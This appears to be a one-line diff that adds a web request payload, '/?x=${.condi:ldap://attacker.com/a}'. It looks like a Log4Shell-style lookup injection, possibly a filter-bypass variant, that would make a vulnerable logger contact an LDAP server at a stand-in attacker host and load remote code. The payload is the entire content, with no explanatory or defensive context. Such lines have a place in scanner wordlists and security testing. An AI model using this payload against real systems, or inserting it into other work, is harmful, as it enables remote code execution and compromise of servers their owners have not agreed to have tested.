@@ -1,0 +1,1 @@
+/?x=${.condi:ldap://attacker.com/a}
